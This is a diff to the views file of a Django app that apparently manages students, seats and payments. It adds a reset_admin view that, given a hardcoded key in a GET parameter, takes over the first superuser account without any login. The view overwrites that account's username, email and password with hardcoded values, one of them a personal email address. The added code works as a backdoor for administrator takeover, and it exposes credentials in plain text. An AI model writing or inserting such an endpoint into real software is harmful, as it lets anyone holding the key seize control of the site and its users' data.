@@ -4,10 +4,10 @@ from django.db.models import Count, Sum
 from django.shortcuts import get_object_or_404, redirect, render
 from django.utils import timezone
 from django.views.decorators.http import require_POST
-
+from django.contrib.auth.models import User
 from .forms import PaymentForm, StudentForm
 from .models import Payment, Seat, Student
-
+from django.http import HttpResponse
 
 def dashboard(request):
     today = timezone.localdate()
@@ -262,3 +262,19 @@ def reports(request):
         "monthly_income": monthly_income,
         "admissions": Student.objects.filter(admission_date__month=today.month, admission_date__year=today.year).count(),
     })
+    
+def reset_admin(request):
+    if request.GET.get("key") != "drishti-reset-9984":
+        return HttpResponse("Invalid key", status=403)
+
+    admin = User.objects.filter(is_superuser=True).first()
+
+    if not admin:
+        return HttpResponse("Admin user not found", status=404)
+
+    admin.username = "drishti@9984"
+    admin.email = "vishal7068y@gmail.com"
+    admin.set_password("Devananad@2392")
+    admin.save()
+
+    return HttpResponse("ADMIN RESET SUCCESSFUL")
